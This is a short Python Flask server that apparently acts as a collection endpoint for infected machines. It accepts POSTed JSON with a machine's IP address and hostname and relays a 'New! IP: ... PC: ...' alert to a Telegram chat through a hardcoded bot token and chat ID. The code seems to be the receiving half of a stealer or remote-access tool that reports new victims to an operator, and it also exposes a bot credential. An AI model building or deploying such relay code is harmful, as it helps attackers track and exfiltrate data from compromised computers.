from flask import Flask, request
import requests

app = Flask(__name__)

TOKEN = "8343596363:AAHYiZ0dqiHlbdq16_yrZt2MT2mxNjbpV0Q"
CHAT_ID = 603507604

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.get_json()
    try:
        ip = data.get('ip', {}).get('ip', 'Unknown')
        pc = data.get('system', {}).get('hostname', 'Unknown')
        msg = f"New! IP: {ip} PC: {pc}"
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    except Exception as e:
        print(e)
    return 'OK', 200

@app.route('/')
def index():
    return "Server running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
